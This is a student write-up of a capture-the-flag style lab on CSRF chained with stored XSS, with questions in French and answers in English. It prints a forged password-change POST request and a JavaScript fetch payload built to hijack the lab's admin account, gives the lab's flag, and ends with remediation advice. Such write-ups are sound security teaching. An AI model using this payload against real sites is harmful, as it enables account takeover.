# Basic CSRF

> 1. Quelle fonctionnalité du site, potentiellement vulnérable à une faille CSRF, pourriez-vous exploiter pour voler le compte administrateur ?

Different places could be vulnerable. I'm thinking about the reset password field or the ask the admin field. 

I presume, to abuse the admin rights, the ask the admin field could be quite interesting. 

> 2. Proposez une requête qui vous permettra de prendre le contrôle du compte admin, si elle était exécutée par l'administrateur.

```
POST /profile/quentin.surdez_admin HTTP/1.1
Host: basic.csrf.slh.cyfr.ch
Content-Type: application/x-www-form-urlencoded

password=1234
```

> 3. Écrivez une payload javascript qui exécute la requête.

```javascript
<script>
fetch("/profile/quentin.surdez_admin", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    "body": "password=1234",
    "method": "POST",
    "mode": "cors",
})
</script>
```

> 4. Quelle fonctionnalité du site, potentiellement vulnérable à une faille **Stored XSS**, pourriez-vous exploiter pour faire exécuter votre payload ?

The ask the admin form could be vulnerable to a Stored XSS if the HTML is displayed directly to the administrator.

> 5. Quel est le flag ? Comment avez-vous pu l'obtenir ?

`z5v/0E13/Y8eFIXz`

We first confirmed our hypothesis to be true by changing the password of our non-restricted profile. 

Then the payload was adapted so that the password of our admin profile is changed.

> 6. Comment corrigeriez-vous la vulnérabilité

User-generated content should be sanitized so that we are sure the content is not malicious. 

Others protections from CSRF could be put into place such as anti-CSRF tokens.